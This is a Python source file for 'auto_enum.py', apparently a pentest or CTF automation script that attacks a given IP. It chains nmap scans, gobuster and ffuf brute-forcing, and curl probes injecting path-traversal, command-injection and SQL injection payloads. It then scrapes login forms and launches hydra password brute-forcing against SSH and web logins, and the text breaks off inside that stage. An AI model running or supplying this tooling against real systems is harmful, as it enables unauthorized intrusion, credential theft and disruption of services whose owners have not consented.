#!/usr/bin/env python3
# auto_enum.py v0.6.3 — two-line sticky status, signal-first, compact flags
# Usage:
#   python3 auto_enum.py <IP> [options]
# Options:
#   -t N      global async concurrency (default 8)
#   -T N      per-command timeout seconds (default 180)
#   -D        "deeper" preset (more endpoints/params; depth+1; +100 endpoints)
#   -S        enable sqlmap micro-pass on SQLi signal
#   -R        hydra uses rockyou (full) instead of quick phase
#   -tg N     gobuster internal -t (default 100)
#   -th N     hydra   internal -t (default 32)
#   -G N      gobuster processes in parallel (default 1)
#   -H N      hydra    processes in parallel (default 1)
#   -Wg PATH  gobuster wordlist override (default: dirbuster 2.3-medium if present)

import argparse, asyncio, json, os, re, shutil, sys, time, xml.etree.ElementTree as ET
from datetime import datetime, timezone
from pathlib import Path
from urllib.parse import urlparse, urljoin as _urljoin

# ===== Defaults =====
DEFAULT_THREADS = 8
DEFAULT_TIMEOUT = 180
DEFAULT_GOBUSTER_T = 100
DEFAULT_HYDRA_T = 32
DEFAULT_GSEM = 1
DEFAULT_HSEM = 1

MAX_RECURSION_DEPTH = 2
MAX_ENDPOINTS_PER_HOST = 100
CURL_MAX_PARAMS = 12
NMAP_SCRIPT_TIMEOUT = "10s"
DUP_STOP_N = 8

# Wordlists (prefer medium if present for gobuster)
WL = {
    "gobuster_medium": "/usr/share/wordlists/dirbuster/directory-list-2.3-medium.txt",
    "gobuster_small": "/usr/share/wordlists/dirbuster/directory-list-2.3-small.txt",
    "ffuf_files": "/usr/share/seclists/Discovery/Web-Content/raft-small-files.txt",
    "ffuf_params": "/usr/share/seclists/Discovery/Web-Content/burp-parameter-names.txt",
    "hydra_users_quick": "/usr/share/seclists/Usernames/top-usernames-shortlist.txt",
    "hydra_pass_quick": "/usr/share/seclists/Passwords/xato-net-10-million-passwords-1000.txt",
    "hydra_pass_rockyou": "/usr/share/wordlists/rockyou.txt",
}

PARAMS_DEFAULT = [
    "id",
    "ids",
    "cat",
    "category",
    "pid",
    "product",
    "uid",
    "user",
    "username",
    "email",
    "page",
    "p",
    "q",
    "s",
    "search",
    "query",
    "filter",
    "type",
    "lang",
    "locale",
    "view",
    "file",
    "path",
    "dir",
    "include",
    "template",
    "year",
    "month",
    "sort",
    "order",
    "ref",
    "key",
    "token",
    "debug",
]

# Extensions (wider): html/htm/bin/exe/elf etc.
GOBUSTER_EXTS = "php,asp,aspx,jsp,html,htm,txt,log,bak,js,py,sh,cgi,conf,cfg,ini,zip,tar,gz,old,backup,db,bin,exe,elf"
FFUF_EXTS = ".php,.asp,.aspx,.jsp,.html,.htm,.txt,.log,.bak,.js,.py,.sh,.cgi,.conf,.cfg,.ini,.zip,.tar,.gz,.old,.backup,.db,.bin,.exe,.elf"
GOBUSTER_STATUS_INCLUDE = {200, 204, 301, 302, 307, 401, 403}

LOGIN_CANDIDATES = [
    "/",
    "/login",
    "/login.php",
    "/admin",
    "/admin/login",
    "/users/login",
    "/account/login",
    "/signin",
    "/auth/login",
    "/wp-login.php",
    "/wp-admin",
    "/xmlrpc.php",
    "/wp-json",
    "/wp-signup.php",
    "/wp-content/",
    "/wp-includes/",
]

FAIL_TOKENS = [
    "invalid",
    "incorrect",
    "try again",
    "unauthorized",
    "failed",
    "wrong password",
    "access denied",
    "authentication failed",
]
GENERIC_FAIL_TOKENS = [
    "invalid",
    "incorrect",
    "failed",
    "unauthorized",
    "error",
    "try again",
]

SQLI_ERROR_SIGNS = [
    "you have an error in your sql",
    "sql syntax",
    "mysql",
    "mariadb",
    "sqlstate",
    "ora-",
    "oracle error",
    "postgresql",
    "sqlite",
    "odbc",
    "pg::syntaxerror",
]

# ===== Global state =====
STATE = {
    "target": "",
    "threads": DEFAULT_THREADS,
    "timeout": DEFAULT_TIMEOUT,
    "http": [],
    "ports": [],
    "dirs": {},
    "files": {},
    "forms": {},
    "findings": {"lfi": [], "rce": [], "sqli": [], "creds": []},
    "sqlmap": False,
    "rockyou": False,
    "deeper": False,
    "tg": DEFAULT_GOBUSTER_T,
    "th": DEFAULT_HYDRA_T,
    "gsem": DEFAULT_GSEM,
    "hsem": DEFAULT_HSEM,
    "gobuster_wl": None,
}

FINDINGS_PATH: Path | None = None

# progress accounting
COUNTS = {
    "nmap": [0, 0],
    "gobuster": [0, 0],
    "ffuf": [0, 0],
    "curl": [0, 0],
    "hydra": [0, 0],
    "sqlmap": [0, 0],
}
RUNNING = {k: 0 for k in COUNTS}
START_TS = time.time()
SPINNER = ["⠋", "⠙", "⠹", "⠸", "⠼", "⠴", "⠦", "⠧", "⠇", "⠏"]

# process semaphores
SEM = {}

# status redraw hold (unused but kept as requested)
STATUS_HOLD_UNTIL = 0.0

# --- Two-line sticky status ---
STATUS_DRAWN = False


def _status_strings():
    elapsed = int(time.time() - START_TS)
    p1 = " | ".join(
        f"{k} {COUNTS[k][1]}/{COUNTS[k][0]}"
        for k in ["nmap", "gobuster", "ffuf", "curl", "hydra", "sqlmap"]
    )
    line1 = f"[{SPINNER[elapsed % len(SPINNER)]}] {p1}"
    q = {k: max(0, COUNTS[k][0] - COUNTS[k][1] - RUNNING[k]) for k in COUNTS}
    line2 = f"queued g:{q['gobuster']} h:{q['hydra']} c:{q['curl']} | running g:{RUNNING['gobuster']} h:{RUNNING['hydra']} c:{RUNNING['curl']} | {elapsed}s elapsed"
    return line1[:140], line2[:140]


def _status_draw():
    """Draw/refresh two status lines in place."""
    global STATUS_DRAWN
    line1, line2 = _status_strings()
    if not sys.stdout.isatty():
        # single compact line for non-TTY
        sys.stdout.write("\r" + (line1 + " | " + line2)[:160])
        sys.stdout.flush()
        return
    if not STATUS_DRAWN:
        sys.stdout.write(line1 + "\n" + line2)
        STATUS_DRAWN = True
    else:
        # move up, clear both, redraw
        sys.stdout.write("\x1b[1A")  # up to first
        sys.stdout.write("\x1b[2K\r" + line1 + "\n")  # clear+write first
        sys.stdout.write("\x1b[2K\r" + line2)  # clear+write second
    sys.stdout.flush()


def _status_clear():
    """Erase the two status lines (for clean messages)."""
    global STATUS_DRAWN
    if not STATUS_DRAWN or not sys.stdout.isatty():
        return
    sys.stdout.write("\x1b[1A\x1b[2K\r")  # clear L1
    sys.stdout.write("\n")  # to L2
    sys.stdout.write("\x1b[2K\r")  # clear L2
    sys.stdout.flush()
    STATUS_DRAWN = False


# ===== Helpers =====
def have(tool):
    return shutil.which(tool) is not None


def urljoin(base, path):
    return _urljoin(base if base.endswith("/") else base + "/", path.lstrip("/"))


def now_utc():
    return datetime.now(timezone.utc).strftime("%Y-%m-%d %H:%M:%S %Z")


def ensure_findings(ip):
    global FINDINGS_PATH
    FINDINGS_PATH = Path(f"./findings_{ip}.txt")
    FINDINGS_PATH.write_text("")
    return FINDINGS_PATH


def fw(line=""):
    if FINDINGS_PATH is None:
        return
    with open(FINDINGS_PATH, "a", encoding="utf-8") as f:
        f.write(line + "\n")


def banner():
    fw("=== auto-enum findings ===")
    fw(f"Target: {STATE['target']}")
    fw(f"Started: {now_utc()}")
    fw(
        f"Threads: {STATE['threads']}  Timeout: {STATE['timeout']}s  Recursion: {MAX_RECURSION_DEPTH + (1 if STATE['deeper'] else 0)}  MaxEndpoints/host: {MAX_ENDPOINTS_PER_HOST + (100 if STATE['deeper'] else 0)}"
    )
    fw("")


def section(title: str):
    """Print a one-line banner above the sticky status."""
    _status_clear()
    sys.stdout.write(f":: {title}\n")
    sys.stdout.flush()
    fw(f":: {title}")
    _status_draw()


def scheduled(msg: str, *, _clear: bool = True):
    """
    Print a scheduled/info line. By default it clears/re-draws around the
    sticky status. Pass _clear=False to print immediately under the last banner.
    """
    if _clear:
        _status_clear()
    sys.stdout.write("+ " + msg + "\n")
    sys.stdout.flush()
    fw("+ " + msg)
    _status_draw()

# --- NEW: print *below* the sticky status, then restore cursor for continued redraws
def section_below(title: str):
    """
    Print a small banner *below* the sticky two-line status without disturbing it.
    We then move the cursor back up two lines so the status can continue refreshing.
    """
    if sys.stdout.isatty():
        sys.stdout.write("\n:: " + title + "\n")
        # Move back to the sticky status second line (2 lines up)
        sys.stdout.write("\x1b[2A")
        sys.stdout.flush()
    else:
        # Non-TTY: just print inline
        sys.stdout.write(" :: " + title + " ")
        sys.stdout.flush()
    fw(":: " + title)


def scheduled_below(msg: str):
    """Companion to section_below: prints a '+ ...' line below the status and restores cursor."""
    if sys.stdout.isatty():
        sys.stdout.write("\n+ " + msg + "\n")
        sys.stdout.write("\x1b[2A")
        sys.stdout.flush()
    else:
        sys.stdout.write(" + " + msg + " ")
        sys.stdout.flush()
    fw("+ " + msg)


def important(msg):
    _status_clear()
    sys.stdout.write("! " + msg + "\n")
    sys.stdout.flush()
    fw("! " + msg)
    _status_draw()


def plan(tool, n=1):
    COUNTS[tool][0] += n


def start_run(tool):
    RUNNING[tool] += 1


def done(tool, n=1):
    COUNTS[tool][1] += n
    RUNNING[tool] = max(0, RUNNING[tool] - n)


def body_sig(text):
    return len(text or ""), (text or "").lower()[:2000]


async def run_cmd(cmd, tool, timeout=None, use_sem=None):
    timeout = timeout or STATE["timeout"]
    sem = SEM.get(use_sem or tool, asyncio.Semaphore(STATE["threads"]))
    async with sem:
        start_run(tool)
        try:
            proc = await asyncio.create_subprocess_exec(
                *cmd, stdout=asyncio.subprocess.PIPE, stderr=asyncio.subprocess.STDOUT
            )
            try:
                out, _ = await asyncio.wait_for(proc.communicate(), timeout=timeout)
            except asyncio.TimeoutError:
                proc.kill()
                await proc.wait()
                return 124, b"[timeout]"
            return proc.returncode, out
        finally:
            done(tool)


def parse_nmap_xml(xml_text):
    ports, http = [], []
    try:
        root = ET.fromstring(xml_text)
    except Exception:
        return ports, http
    host = root.find("host")
    if host is None:
        return ports, http
    for port in host.findall(".//port"):
        st = port.find("state")
        if st is None or st.attrib.get("state") != "open":
            continue
        portid = int(port.attrib.get("portid") or port.attrib.get("port"))
        proto = port.attrib.get("protocol")
        svcnode = port.find("service")
        svc = svcnode.attrib.get("name") if svcnode is not None else "unknown"
        product = svcnode.attrib.get("product") if svcnode is not None else ""
        ports.append(
            {"port": portid, "proto": proto, "service": svc, "product": product}
        )
        if svc.startswith("http"):
            http.append(
                {"port": portid, "scheme": "http" if svc == "http" else "https"}
            )
    ports.sort(key=lambda x: x["port"])
    return ports, http


def parse_gobuster_lines(text):
    res = []
    for line in text.splitlines():
        m = re.match(r"^(/\S+)\s+\(Status:\s*(\d+)\)", line.strip())
        if m:
            res.append((m.group(1), int(m.group(2))))
    return res


def extract_forms(html):
    forms = []
    for fm in re.finditer(r"<form[^>]*>(.*?)</form>", html, flags=re.I | re.S):
        form_html = fm.group(0)
        method = re.search(r"method=['\"]?(\w+)", form_html, flags=re.I)
        action = re.search(r"action=['\"]?([^'\" >]+)", form_html, flags=re.I)
        inputs = []
        for im in re.finditer(r"<input[^>]*>", form_html, flags=re.I):
            name = re.search(r"name=['\"]?([^'\" >]+)", im.group(0), flags=re.I)
            typ = re.search(r"type=['\"]?([^'\" >]+)", im.group(0), flags=re.I)
            val = re.search(r"value=['\"]?([^'\" >]*)", im.group(0), flags=re.I)
            inputs.append(
                {
                    "name": (name.group(1) if name else None),
                    "type": (typ.group(1).lower() if typ else "text"),
                    "value": (val.group(1) if val else ""),
                }
            )
        forms.append(
            {
                "method": (method.group(1).lower() if method else "get"),
                "action": (action.group(1) if action else ""),
                "inputs": inputs,
            }
        )
    return forms


def pick_user_pass_fields(inputs):
    user_candidates = ["user", "username", "email", "login", "userid", "mail"]
    pass_candidates = ["pass", "password", "passwd", "pwd"]
    user_field = None
    pass_field = None
    others = []
    for inp in inputs:
        n = (inp["name"] or "").lower()
        t = (inp["type"] or "text").lower()
        if not n:
            continue
        if not user_field and (n in user_candidates or (t == "text" and "user" in n)):
            user_field = n
            continue
        if not pass_field and (n in pass_candidates or t == "password"):
            pass_field = n
            continue
        if t in ["hidden", "submit"] or n not in [user_field, pass_field]:
            others.append(inp)
    return user_field, pass_field, others


def resolve_action(base, action):
    if not action or action.strip() == "":
        return base
    pu = urlparse(action)
    if pu.scheme and pu.netloc:
        return action
    return urljoin(base, action)


# ===== Status loop =====
async def status_loop():
    if not sys.stdout.isatty():
        while True:
            _status_draw()
            await asyncio.sleep(5)
    else:
        while True:
            _status_draw()
            await asyncio.sleep(1)


# ===== Stages =====
async def stage_nmap():
    # 1) Fast top ports, then 2) targeted sV/sC on the open set
    plan("nmap", 2)
    rc, out = await run_cmd(
        ["nmap", "-Pn", "-T4", "-F", "-oX", "-", "-n", STATE["target"]], tool="nmap"
    )
    ports, http = parse_nmap_xml(out.decode(errors="ignore"))
    STATE["ports"] = ports
    STATE["http"] = http
    fw(
        "[nmap] open ports: "
        + (", ".join(f"{p['port']}/{p['service']}" for p in ports) or "none")
    )

    if ports:
        plist = ",".join(str(p["port"]) for p in ports)
        rc2, out2 = await run_cmd(
            [
                "nmap",
                "-Pn",
                "-T4",
                "-sV",
                "-sC",
                "--script-timeout",
                NMAP_SCRIPT_TIMEOUT,
                "-p",
                plist,
                "-oX",
                "-",
                "-n",
                STATE["target"],
            ],
            tool="nmap",
        )
        p2, h2 = parse_nmap_xml(out2.decode(errors="ignore"))
        if p2:
            idx = {p["port"]: p for p in p2}
            for p in STATE["ports"]:
                if p["port"] in idx:
                    p.update(idx[p["port"]])
        if h2:
            STATE["http"] = h2
            for h in h2:
                # Show banner *below* the spinner/status
                section_below(f"http {h['port']}/http detected")
                scheduled_below("scheduling NSE + web enum")

    # services + http endpoints into findings
    if STATE["ports"]:
        fw("\n[services]")
        for p in STATE["ports"]:
            prod = f" ({p['product']})" if p.get("product") else ""
            fw(f"  - {p['port']}/{p['proto']} {p['service']}{prod}")
    if STATE["http"]:
        fw("\n[http services]")
        for h in STATE["http"]:
            fw(f"  - {h['scheme']}://{STATE['target']}:{h['port']}")


async def stage_nse():
    if not STATE["ports"]:
        return
    per_service = {
        "ssh": ["ssh2-enum-algos", "ssh-hostkey"],
        "ftp": ["ftp-anon", "ftp-syst"],
        "smb": ["smb-os-discovery", "smb-enum-shares", "smb-enum-users"],
        "rdp": ["rdp-enum-encryption"],
        "mysql": ["mysql-info"],
        # http is handled via http-* scripts below
    }
    tasks = []
    for p in STATE["ports"]:
        svc = p["service"]
        scripts = (
            ["http-title", "http-headers", "http-enum", "http-methods"]
            if svc.startswith("http")
            else per_service.get(svc, [])
        )
        if not scripts:
            continue
        plan("nmap", 1)
        tasks.append(
            run_cmd(
                [
                    "nmap",
                    "-Pn",
                    "-p",
                    str(p["port"]),
                    "--script",
                    ",".join(scripts),
                    "--script-timeout",
                    NMAP_SCRIPT_TIMEOUT,
                    "-oN",
                    "-",
                    "-n",
                    STATE["target"],
                ],
                tool="nmap",
            )
        )
    if tasks:
        await asyncio.gather(*tasks)


async def stage_gobuster():
    if not STATE["http"] or not have("gobuster"):
        return
    wl = STATE["gobuster_wl"]
    if not wl:
        if os.path.exists(WL["gobuster_medium"]):
            wl = WL["gobuster_medium"]
        elif os.path.exists(WL["gobuster_small"]):
            wl = WL["gobuster_small"]

    async def run_once(base, port, subpath="/", depth=0):
        max_depth = MAX_RECURSION_DEPTH + (1 if STATE["deeper"] else 0)
        if depth > max_depth:
            return
        url = urljoin(base, subpath)
        cmd = [
            "gobuster",
            "dir",
            "-u",
            url,
            "-q",
            "-k",
            "-t",
            str(STATE["tg"]),
            "-x",
            GOBUSTER_EXTS,
        ]
        if wl:
            cmd += ["-w", wl]
        plan("gobuster", 1)
        rc, out = await run_cmd(cmd, tool="gobuster", use_sem="gobuster")
        text = (
            out.decode(errors="ignore")
            if isinstance(out, (bytes, bytearray))
            else str(out)
        )
        found = parse_gobuster_lines(text)
        STATE["dirs"].setdefault(port, set())
        STATE["files"].setdefault(port, set())
        rec = []
        for path, code in found:
            if code not in GOBUSTER_STATUS_INCLUDE:
                continue
            if path.endswith("/"):
                if path not in STATE["dirs"][port]:
                    STATE["dirs"][port].add(path)
                    rec.append(path)
                    scheduled(f"gobuster: {path} found → recursion scheduled")
            else:
                STATE["files"][port].add(path)
        for sp in rec:
            await run_once(base, port, sp, depth + 1)

    for h in STATE["http"]:
        base = f"{h['scheme']}://{STATE['target']}:{h['port']}/"
        await run_once(base, h["port"], "/", 0)

    def rank(paths):
        score = []
        for p in paths:
            s = 0
            low = p.lower()
            for kw in [
                "login",
                "admin",
                "wp-",
                "backup",
                "bak",
                "config",
                "upload",
                "shell",
                "old",
                "save",
                "include",
                "test",
                "mail",
            ]:
                if kw in low:
                    s += 2
            if low.endswith(
                (
                    ".php",
                    ".asp",
                    ".aspx",
                    ".jsp",
                    ".html",
                    ".htm",
                    ".bak",
                    ".old",
                    ".zip",
                    ".tar",
                    ".gz",
                    ".log",
                    ".db",
                    ".cfg",
                    ".conf",
                    ".ini",
                    ".sh",
                    ".py",
                    ".cgi",
                    ".js",
                    ".bin",
                    ".exe",
                    ".elf",
                )
            ):
                s += 1
            score.append((s, p))
        return [p for _, p in sorted(score, key=lambda x: (-x[0], x[1]))]

    if STATE["http"]:
        fw("\n[web: interesting paths]")
        for h in STATE["http"]:
            pd = rank(STATE["dirs"].get(h["port"], set()))
            pf = rank(STATE["files"].get(h["port"], set()))
            if pd or pf:
                fw(f"  - {h['scheme']}:{h['port']}")
            if pd:
                fw("     dirs: " + ", ".join(pd[:30]))
            if pf:
                fw("     files: " + ", ".join(pf[:30]))


async def stage_ffuf():
    if not STATE["http"] or not have("ffuf"):
        return
    files_wl = WL["ffuf_files"] if os.path.exists(WL["ffuf_files"]) else None
    params_wl = WL["ffuf_params"] if os.path.exists(WL["ffuf_params"]) else None

    async def ffuf_files(base, port, subpath="/"):
        url = urljoin(base, subpath.rstrip("/") + "/FUZZ")
        cmd = [
            "ffuf",
            "-u",
            url,
            "-mc",
            "200,204,301,302,307,401,403",
            "-ac",
            "-of",
            "json",
            "-t",
            "50",
            "-k",
            "-e",
            FFUF_EXTS,
        ]
        if files_wl:
            cmd += ["-w", files_wl]
        plan("ffuf", 1)
        rc, out = await run_cmd(cmd, tool="ffuf")
        try:
            data = json.loads(out.decode(errors="ignore"))
            results = [
                {
                    "status": r.get("status"),
                    "url": r.get("url"),
                    "length": r.get("length"),
                }
                for r in data.get("results", [])
            ]
        except Exception:
            results = []
        return results

    async def ffuf_params(base, port, endpoint="/index.php"):
        url = urljoin(base, endpoint) + "?FUZZ=1"
        cmd = [
            "ffuf",
            "-u",
            url,
            "-mc",
            "200,204,301,302,307,401,403",
            "-ac",
            "-of",
            "json",
            "-t",
            "50",
            "-k",
        ]
        if params_wl:
            cmd += ["-w", params_wl]
        plan("ffuf", 1)
        rc, out = await run_cmd(cmd, tool="ffuf")
        params = []
        try:
            data = json.loads(out.decode(errors="ignore"))
            for _ in data.get("results", []):
                params.append("FUZZ")
        except Exception:
            pass
        return params

    hits_all = []
    params_any = []
    for h in STATE["http"]:
        base = f"{h['scheme']}://{STATE['target']}:{h['port']}/"
        hits_all.extend(await ffuf_files(base, h["port"], "/") or [])
        for d in list(STATE["dirs"].get(h["port"], set()))[:10]:
            hits_all.extend(await ffuf_files(base, h["port"], d) or [])
        for ep in ["/index.php", "/login.php", "/search.php", "/wp-login.php"]:
            params_any.extend(await ffuf_params(base, h["port"], ep) or [])

    if hits_all:
        fw("\n[ffuf hits]")
        for r in hits_all[:30]:
            fw(f"  - {r['status']} {r['url']} ({r.get('length')})")
    if params_any:
        scheduled(f"ffuf: parameters discovered on endpoints → targeted curls queued")


# ---- curl: headers + LFI/RCE + GET SQLi quick ----
async def stage_curl_and_signals():
    if not STATE["http"]:
        return

    async def head(url):
        plan("curl", 1)
        rc, out = await run_cmd(
            ["curl", "-k", "-I", "-sS", "-m", str(STATE["timeout"]), url], tool="curl"
        )
        return rc, (
            out.decode(errors="ignore")
            if isinstance(out, (bytes, bytearray))
            else str(out)
        )

    async def get(url):
        plan("curl", 1)
        rc, out = await run_cmd(
            ["curl", "-k", "-sS", "-m", str(STATE["timeout"]), url], tool="curl"
        )
        return rc, (
            out.decode(errors="ignore")
            if isinstance(out, (bytes, bytearray))
            else str(out)
        )

    async def lfi_rce_sqli_on_endpoint(base_url, param_sources):
        last_sig = None
        repeat = 0
        strong_found = {"lfi": False, "rce": False, "sqli": False}

        for p in param_sources:
            if strong_found["lfi"]:
                break
            for pl in [
                "etc/passwd",
                "../../../../etc/passwd",
                "..%2f..%2f..%2f..%2fetc%2fpasswd",
                "windows/win.ini",
                "../../../../windows/win.ini",
                "php://filter/convert.base64-encode/resource=index.php",
            ]:
                _, body = await get(f"{base_url}?{p}={pl}")
                low = body.lower()
                if (
                    "root:x:0:0:" in low
                    or "daemon:x:1:1:" in low
                    or "[extensions]" in body
                ):
                    STATE["findings"]["lfi"].append(
                        {
                            "url": f"{base_url}?{p}={pl}",
                            "evidence": "etc/passwd/win.ini/php-filter",
                        }
                    )
                    important(f"LFI indicator → {base_url}?{p}=…")
                    strong_found["lfi"] = True
                    break

        for p in ["cmd", "exec", "query", "calc", "run", "shell", "proc"]:
            _, body = await get(f"{base_url}?{p}=id")
            low = body.lower()
            if "uid=" in low and "gid=" in low:
                STATE["findings"]["rce"].append(
                    {"url": f"{base_url}?{p}=id", "evidence": "id() output"}
                )
                important(f"RCE indicator → {base_url}?{p}=id")
                strong_found["rce"] = True
                break

        cap_params = CURL_MAX_PARAMS + (8 if STATE["deeper"] else 0)
        for p in param_sources[:cap_params]:
            if strong_found["sqli"]:
                break
            _, b0 = await get(f"{base_url}?{p}=1")
            l0, s0 = body_sig(b0)
            for inj in ["'", '"']:
                _, be = await get(f"{base_url}?{p}=1{inj}")
                if any(sig in (be or "").lower() for sig in SQLI_ERROR_SIGNS):
                    STATE["findings"]["sqli"].append(
                        {
                            "url": f"{base_url}?{p}=<inj>",
                            "param": p,
                            "type": "error",
                            "payload": inj,
                        }
                    )
                    important(f"SQLi(error) → {base_url}?{p}=<inj>")
                    strong_found["sqli"] = True
                    break
            if strong_found["sqli"]:
                break
            tests = [
                ("' AND 1=1-- -", "' AND 1=2-- -"),
                ('" AND 1=1-- -', '" AND 1=2-- -'),
                (") AND 1=1-- -", ") AND 1=2-- -"),
                ("' OR '1'='1'-- -", "' OR '1'='2'-- -"),
            ]
            for t_true, t_false in tests:
                _, b1 = await get(f"{base_url}?{p}=1{t_true}")
                _, b2 = await get(f"{base_url}?{p}=1{t_false}")
                l1, s1 = body_sig(b1)
                l2, s2 = body_sig(b2)
                if abs(l1 - l0) < 20 and abs(l2 - l0) > 50:
                    STATE["findings"]["sqli"].append(
                        {
                            "url": f"{base_url}?{p}=<inj>",
                            "param": p,
                            "type": "boolean",
                            "payload": t_true,
                        }
                    )
                    important(f"SQLi(boolean) → {base_url}?{p}=<inj>")
                    strong_found["sqli"] = True
                    break
            sig = (l0, s0[:200])
            if last_sig == sig:
                repeat += 1
            else:
                repeat = 0
            last_sig = sig
            if repeat >= DUP_STOP_N:
                break

    for h in STATE["http"]:
        base = f"{h['scheme']}://{STATE['target']}:{h['port']}"
        await head(base + "/")
        eps = [
            "/index.php",
            "/search.php",
            "/product.php",
            "/item.php",
            "/wp-json/wp/v2/users",
        ]
        for fpath in STATE["files"].get(h["port"], set()):
            if any(
                fpath.lower().endswith(ext)
                for ext in (".php", ".asp", ".aspx", ".jsp", ".html", ".htm")
            ):
                eps.append(fpath)
        seen = set()
        uniq = []
        for e in eps:
            e = e if e.startswith("/") else "/" + e
            if e not in seen:
                seen.add(e)
                uniq.append(e)
        uniq = uniq[: (MAX_ENDPOINTS_PER_HOST + (100 if STATE["deeper"] else 0))]

        form_params = []
        for form in STATE["forms"].get(h["port"], []):
            if form.get("basic"):
                continue
            for pair in form.get("fields", "").split("&"):
                k = pair.split("=", 1)[0]
                if k and k not in form_params:
                    form_params.append(k)
        merged = form_params + [p for p in PARAMS_DEFAULT if p not in form_params]

        for ep in uniq:
            await lfi_rce_sqli_on_endpoint(urljoin(base, ep), merged)


# ---- Forms discovery & hydra prep ----
async def stage_forms_and_hydra_prep():
    if not STATE["http"]:
        return

    async def get(url):
        plan("curl", 1)
        rc, out = await run_cmd(
            ["curl", "-k", "-sS", "-m", str(STATE["timeout"]), url], tool="curl"
        )
        return rc, (
            out.decode(errors="ignore")
            if isinstance(out, (bytes, bytearray))
            else str(out)
        )

    async def post(url, data):
        plan("curl", 1)
        rc, out = await run_cmd(
            [
                "curl",
                "-k",
                "-sS",
                "-m",
                str(STATE["timeout"]),
                "-X",
                "POST",
                "-d",
                data,
                url,
            ],
            tool="curl",
        )
        return rc, (
            out.decode(errors="ignore")
            if isinstance(out, (bytes, bytearray))
            else str(out)
        )

    for h in STATE["http"]:
        port = h["port"]
        scheme = h["scheme"]
        base = f"{scheme}://{STATE['target']}:{port}"
        STATE["forms"].setdefault(port, [])

        plan("curl", 1)
        rc, hdrs = await run_cmd(
            ["curl", "-k", "-I", "-sS", "-m", str(STATE["timeout"]), base + "/"],
            tool="curl",
        )
        txt = (
            hdrs.decode(errors="ignore")
            if isinstance(hdrs, (bytes, bytearray))
            else str(hdrs)
        )
        if " 401 " in txt and "www-authenticate:" in txt.lower():
            module = "https-get" if scheme == "https" else "http-get"
            STATE["forms"][port].append(
                {
                    "module": module,
                    "path": "/",
                    "fields": None,
                    "fail": None,
                    "port": port,
                    "scheme": scheme,
                    "basic": True,
                }
            )
            scheduled(f"http {port} 401 → hydra basic-auth scheduled")

        candidates = list(LOGIN_CANDIDATES)
        for fp in STATE["files"].get(port, set()):
            if any(tok in fp.lower() for tok in ["login", "signin", "auth"]):
                candidates.append(fp)
        seen = set()
        for path in candidates:
            path = path if path.startswith("/") else "/" + path
            if (port, path) in seen:
                continue
            seen.add((port, path))
            _, html = await get(urljoin(base, path))
            forms = extract_forms(html)
            for f in forms:
                ufield, pfield, others = pick_user_pass_fields(f["inputs"])
                if not (ufield and pfield):
                    continue
                action_abs = resolve_action(urljoin(base, path), f["action"])
                method = f["method"] or "post"
                dummy_user, dummy_pass = "notrealuser", "notrealpass123!A"
                if method == "get":
                    q = f"{ufield}={dummy_user}&{pfield}={dummy_pass}" + "".join(
                        f"&{o['name']}={o.get('value','')}" for o in others if o["name"]
                    )
                    _, body = await get(
                        action_abs + ("&" if "?" in action_abs else "?") + q
                    )
                else:
                    data = f"{ufield}={dummy_user}&{pfield}={dummy_pass}" + "".join(
                        f"&{o['name']}={o.get('value','')}" for o in others if o["name"]
                    )
                    _, body = await post(action_abs, data)
                token = None
                low = body.lower()
                for tok in FAIL_TOKENS:
                    if tok in low:
                        token = tok
                        break
                if not token:
                    token = GENERIC_FAIL_TOKENS[0]
                parsed = urlparse(action_abs)
                path_only = parsed.path or "/"
                if parsed.query:
                    path_only += "?" + parsed.query
                module = ("https" if scheme == "https" else "http") + (
                    "-post-form" if method == "post" else "-get-form"
                )
                fields = f"{ufield}=^USER^&{pfield}=^PASS^" + "".join(
                    f"&{o['name']}={o.get('value','')}" for o in others if o["name"]
                )
                STATE["forms"][port].append(
                    {
                        "module": module,
                        "path": path_only,
                        "fields": fields,
                        "fail": token,
                        "port": port,
                        "scheme": scheme,
                        "basic": False,
                    }
                )
                scheduled(
                    f"form: {path_only} ({'POST' if 'post-form' in module else 'GET'}) → hydra job prepared"
                )


# ---- Hydra brute ----
async def stage_hydra():
    if not have("hydra"):
        return
    if any(p["service"] == "ssh" for p in STATE["ports"]):
        users = (
            WL["hydra_users_quick"] if os.path.exists(WL["hydra_users_quick"]) else "-"
        )
        passlist = (
            WL["hydra_pass_rockyou"]
            if (STATE["rockyou"] and os.path.exists(WL["hydra_pass_rockyou"]))
            else (
                WL["hydra_pass_quick"]
                if os.path.exists(WL["hydra_pass_quick"])
                else "-"
            )
        )
        cmd = [
            "hydra",
            "-L",
            users if users != "-" else "/dev/stdin",
            "-P",
            passlist if passlist != "-" else "/dev/stdin",
            "-t",
            str(STATE["th"]),
            "-f",
            "-I",
            "-V",
            STATE["target"],
            "ssh",
        ]
        plan("hydra", 1)
        if users == "-" or passlist == "-":
            data = b"root\nadmin\n" + (
                b"admin\npassword\n123456\n" if passlist == "-" else b""
            )
            proc = await asyncio.create_subprocess_exec(
                *cmd,
                stdin=asyncio.subprocess.PIPE,
                stdout=asyncio.subprocess.PIPE,
                stderr=asyncio.subprocess.STDOUT,
            )
            out, _ = await proc.communicate(data)
            text = out.decode(errors="ignore")
            done("hydra")
        else:
            rc, out = await run_cmd(cmd, tool="hydra", use_sem="hydra")
            text = (
                out.decode(errors="ignore")
                if isinstance(out, (bytes, bytearray))
                else str(out)
            )
        for line in text.splitlines():
            if "login:" in line and "password:" in line:
                STATE["findings"]["creds"].append(
                    {"service": "ssh", "line": line.strip()}
                )
                important(f"HYDRA HIT (ssh): {line.strip()}")

    for h in STATE["http"]:
        port = h["port"]
        scheme = h["scheme"]
        for j in STATE["forms"].get(port, []):
            users = (
                WL["hydra_users_quick"]
                if os.path.exists(WL["hydra_users_quick"])
                else "-"
            )
            passlist = (
                WL["hydra_pass_rockyou"]
                if (STATE["rockyou"] and os.path.exists(WL["hydra_pass_rockyou"]))
                else (
                    WL["hydra_pass_quick"]
                    if os.path.exists(WL["hydra_pass_quick"])
                    else "-"
                )
            )
            module = j["module"]
            cmd = [
                "hydra",
                "-L",
                users if users != "-" else "/dev/stdin",
                "-P",
                passlist if passlist != "-" else "/dev/stdin",
                "-t",
                str(STATE["th"]),
                "-f",
                "-I",
                "-V",
                STATE["target"],
                module,
            ]
            path_arg = (
                j["path"]
                if j.get("basic")
                else f"{j['path']}:{j['fields']}:F={j['fail']}"
            )
            cmd.append(path_arg)
            if (scheme == "http" and j["port"] != 80) or (
                scheme == "https" and j["port"] != 443
            ):
                cmd = ["hydra", "-s", str(j["port"])] + cmd[1:]
            plan("hydra", 1)
            if users == "-" or passlist == "-":
                data = b"admin\n" + (
